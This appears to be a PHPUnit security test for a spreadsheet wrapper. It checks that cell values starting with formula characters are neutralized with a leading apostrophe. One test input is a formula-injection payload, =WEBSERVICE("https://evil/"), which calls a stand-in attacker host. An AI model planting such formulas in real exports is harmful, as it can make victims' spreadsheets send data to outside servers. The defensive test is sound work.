<?php

namespace DreamFactory\Core\Excel\Tests\Security;

use DreamFactory\Core\Excel\Components\PHPSpreadsheetWrapper;
use PHPUnit\Framework\TestCase;

/**
 * Security: cell values that look like formulas (=, +, -, @, TAB, CR) get a
 * leading apostrophe so a downstream Excel/CSV consumer renders them as text
 * instead of evaluating them.
 */
class FormulaNeutralizationTest extends TestCase
{
    /** @dataProvider valueProvider */
    public function testNeutralize($input, $expected): void
    {
        $this->assertSame($expected, PHPSpreadsheetWrapper::neutralizeFormula($input));
    }

    public static function valueProvider(): array
    {
        return [
            ['=WEBSERVICE("https://evil/")', "'=WEBSERVICE(\"https://evil/\")"],
            ['=1+1', "'=1+1"],
            ['+1+1', "'+1+1"],
            ['-1+1', "'-1+1"],
            ['@SUM(A1:A2)', "'@SUM(A1:A2)"],
            ["\tinjected", "'\tinjected"],
            ["\rinjected", "'\rinjected"],
            ['plain text', 'plain text'],
            ['', ''],
            [null, null],
            [42, 42],
            [3.14, 3.14],
        ];
    }
}
